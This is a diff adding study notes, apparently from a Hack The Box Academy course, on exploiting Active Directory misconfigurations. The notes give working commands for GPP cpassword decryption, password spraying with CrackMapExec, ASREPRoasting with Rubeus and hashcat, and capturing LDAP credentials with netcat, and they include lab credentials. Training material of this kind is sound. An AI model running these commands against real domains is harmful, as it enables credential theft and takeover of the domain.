@@ -2830,6 +2830,290 @@ Once authentication is coerced and a valid Kerberos ticket is available, Mimikat
 
 ---
 
+# Miscellaneous Misconfigurations in Active Directory (AD)
+
+Active Directory (AD) misconfigurations can present numerous opportunities for attackers to escalate privileges, access sensitive data, and compromise domains. Below is a breakdown of various attack vectors, tools, and techniques to identify and exploit misconfigurations.
+
+
+
+#### **1. Scenario Setup**
+- **Windows and Linux Host Setup**:
+  - Windows attack host: `MS01` (connect via RDP).
+  - Linux interaction from MS01: Use PowerShell to SSH into `172.16.5.225` with credentials:
+    ```
+    htb-student:HTB_@cademy_stdnt!
+    ```
+
+
+#### **2. Exchange Related Misconfigurations**
+- **Groups with Elevated Privileges**:
+  - **Exchange Windows Permissions**:
+    - Can write Domain ACLs (DACLs), granting DCSync privileges to users.
+    - Accounts often added via misconfigurations include:
+      - **Power users**, **support staff**, and computers.
+  - **Organization Management**:
+    - Equivalent to "Domain Admins" for Exchange.
+    - Grants full control over the `Microsoft Exchange Security Groups` OU.
+    - Can access mailboxes of all domain users.
+
+- **PrivExchange Attack**:
+  - Exploits the Exchange PushSubscription feature to force the Exchange server to authenticate over HTTP.
+  - Outcomes:
+    - Dump NTDS database.
+    - Authenticate to other domain hosts.
+    - Escalate to Domain Admin with any domain user account.
+
+
+
+#### **3. Printer Bug**
+- **Vulnerability**: MS-RPRN Protocol.
+- **Description**:
+  - Exploits the RpcOpenPrinter and RpcRemoteFindFirstPrinterChangeNotificationEx methods.
+  - Forces authentication to an attacker-specified host via SMB.
+- **Potential Outcomes**:
+  - Relay LDAP authentication to grant:
+    - **DCSync privileges**.
+    - **Resource-Based Constrained Delegation (RBCD)** privileges.
+  - Compromise Domain Controllers (DCs) in partner domains/forests.
+- **Tools**:
+  - `Get-SpoolStatus` from `SecurityAssessment.ps1`.
+  - Example:
+    ```powershell
+    Import-Module .\SecurityAssessment.ps1
+    Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+    ```
+
+
+
+#### **4. MS14-068**
+- **Vulnerability**: Kerberos PAC Validation.
+- **Description**:
+  - Forged PAC accepted by KDC allows privilege escalation to Domain Admin.
+- **Exploitation Tools**:
+  - Python Kerberos Exploitation Kit (PyKEK).
+  - Impacket toolkit.
+
+
+
+#### **5. Sniffing LDAP Credentials**
+- **Description**:
+  - Devices store LDAP credentials in their admin consoles.
+  - Can use weak/default passwords or capture them with netcat on LDAP port `389`.
+  - Example setup:
+    ```bash
+    nc -lvp 389
+    ```
+
+
+
+#### **6. Enumerating DNS Records**
+- **Tool**: `adidnsdump`.
+- **Description**:
+  - Resolves DNS records in AD domains using valid domain user credentials.
+  - Discovers "hidden" records pointing to interesting hosts.
+- **Command Examples**:
+  - Enumerate records:
+    ```bash
+    adidnsdump -u domain\user ldap://<IP>
+    ```
+  - Resolve unknown records:
+    ```bash
+    adidnsdump -u domain\user ldap://<IP> -r
+    ```
+
+
+
+#### **7. Password in Description Field**
+- **Description**:
+  - Account passwords are sometimes stored in the `Description` or `Notes` fields.
+  - These can be quickly enumerated using PowerView.
+- **Example Command**:
+  ```powershell
+  Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
+  ```
+
+
+
+#### **8. PASSWD_NOTREQD Field**
+- **Description**:
+  - Indicates accounts not subject to password policies.
+  - May allow empty or weak passwords.
+- **Command**:
+  ```powershell
+  Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+  ```
+
+
+
+#### **9. Credentials in SMB Shares and SYSVOL Scripts**
+- **Description**:
+  - Sensitive data (e.g., passwords) can often be found in scripts in the SYSVOL share.
+- **Example**:
+  - Listing contents:
+    ```powershell
+    ls \\<DC>\SYSVOL\<DOMAIN>\scripts
+    ```
+  - Reviewing script content:
+    ```powershell
+    cat \\<DC>\SYSVOL\<DOMAIN>\scripts\<script-name>
+    ```
+
+
+
+#### **Example: Exploiting SYSVOL**
+- Script found:
+  - `reset_local_admin_pass.vbs`.
+- Example Content:
+  ```vbs
+  sUser = "Administrator"
+  sPwd = "!ILFREIGHT_L0cALADmin!"
+  ```
+- Use CrackMapExec to test:
+  ```bash
+  crackmapexec smb <IP> -u Administrator -p '!ILFREIGHT_L0cALADmin!' --local-auth
+  ```
+
+### Group Policy Preferences (GPP) Passwords and Related Misconfigurations
+
+Group Policy Preferences (GPP) are a feature in Active Directory (AD) that allows administrators to configure settings for users and computers. However, due to misconfigurations and legacy practices, GPP can be exploited by attackers. Below is a simplified explanation of the concepts and how attackers can leverage these vulnerabilities, along with commands for practical use.
+
+
+
+#### **1. What are GPP Passwords?**
+- GPP configurations are stored in `.xml` files in the `SYSVOL` share, which can be accessed by any authenticated domain user.
+- These XML files may contain **cpassword** attributes, which store passwords encrypted using AES-256.
+- Microsoft published the AES decryption key, enabling attackers to decrypt stored passwords.
+
+**Common GPP XML Files:**
+- `drives.xml`: Configures mapped drives.
+- `printers.xml`: Printer configurations.
+- `services.xml`: Service management.
+- `groups.xml`: Used to create/update users (may contain passwords).
+- `scheduledtasks.xml`: Manages scheduled tasks.
+
+---
+
+#### **2. Exploiting GPP Passwords**
+- **Decryption**: Use tools like `gpp-decrypt` to decrypt cpassword values.
+- **Persistence**: Even after MS14-025 patch (2014), existing GPP XML files are not removed automatically. Cached copies may remain on endpoints if GPP is deleted without unlinking it from the OU.
+
+**Example of cpassword in XML:**
+```xml
+<Groups>
+    <User>
+        <Properties userName="Admin" cpassword="VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE" />
+    </User>
+</Groups>
+```
+
+**Decrypt cpassword:**
+```bash
+gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+# Output: Password1
+```
+
+
+
+#### **3. Locating and Retrieving GPP Passwords**
+- **Manually Browse SYSVOL**: Use PowerShell to explore:
+    ```powershell
+    ls \\<DomainController>\SYSVOL\<Domain>\Policies\*\Preferences\*
+    ```
+
+- **Automated Tools**:
+    - `Get-GPPPassword.ps1`: Extract and decrypt passwords.
+    - `CrackMapExec`:
+        ```bash
+        crackmapexec smb <IP> -M gpp_password
+        ```
+
+- **Registry Autologon**: Passwords may also be found in `Registry.xml` for autologon configurations.
+    ```bash
+    crackmapexec smb <IP> -M gpp_autologin
+    ```
+
+
+
+#### **4. Password Reuse and Password Spraying**
+- Extracted GPP passwords are often for legacy accounts. Even if the account is locked or deleted:
+  - Attempt **password spraying**: Test if the password works for other accounts.
+  - Test for **local admin access** on endpoints.
+
+**Example: CrackMapExec Password Spray**
+```bash
+crackmapexec smb <IP> -u <username> -p '<password>' --local-auth
+```
+
+
+
+#### **5. ASREPRoasting (Kerberos Pre-Authentication)**
+- **What It Is**:
+  - Accounts with the `Do not require Kerberos pre-authentication` setting are vulnerable.
+  - Attackers can request an AS-REP ticket, which is encrypted with the account password. This can then be cracked offline.
+  
+- **Enumeration**:
+    ```powershell
+    Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol
+    ```
+
+- **Retrieve AS-REP Ticket**:
+    - Use `Rubeus`:
+        ```powershell
+        Rubeus.exe asreproast /user:<username> /nowrap /format:hashcat
+        ```
+    - Use `GetNPUsers.py`:
+        ```bash
+        GetNPUsers.py <DOMAIN>/ -dc-ip <IP> -usersfile <userlist>
+        ```
+
+- **Crack the Hash Offline**:
+    ```bash
+    hashcat -m 18200 <ASREP_hash> /usr/share/wordlists/rockyou.txt
+    ```
+
+
+
+#### **6. Group Policy Object (GPO) Abuse**
+- **What It Is**:
+  - GPOs configure policies for users/computers in AD.
+  - Misconfigured GPOs can allow attackers to escalate privileges, gain persistence, or move laterally within the domain.
+
+- **Enumeration**:
+    - Using PowerView:
+        ```powershell
+        Get-DomainGPO | select displayname
+        ```
+    - Using built-in cmdlets:
+        ```powershell
+        Get-GPO -All | select DisplayName
+        ```
+
+- **Checking Permissions**:
+    ```powershell
+    $sid = Convert-NameToSid "Domain Users"
+    Get-DomainGPO | Get-ObjectAcl | ? { $_.SecurityIdentifier -eq $sid }
+    ```
+
+- **Exploitation Tools**:
+    - `SharpGPOAbuse`: Modify GPOs to add users, execute tasks, or run scripts on target systems.
+    - **Caution**: Modify GPOs carefully, especially if they apply to large OUs with many computers.
+
+
+#### **7. Mitigation Recommendations**
+- **GPP Passwords**:
+  - Remove GPP files with passwords from SYSVOL.
+  - Rotate passwords for accounts previously configured in GPP.
+- **ASREPRoasting**:
+  - Ensure accounts do not have the `Do not require Kerberos pre-authentication` setting enabled.
+- **GPOs**:
+  - Audit permissions on GPOs regularly.
+  - Restrict access to sensitive GPOs.
+
+
+
+---
+
+
 # Domain Trusts Primer
 ### Domain Trusts Overview
 A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources or perform administrative tasks in another domain, outside of the main domain where their account resides. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. An organization can create various types of trusts:
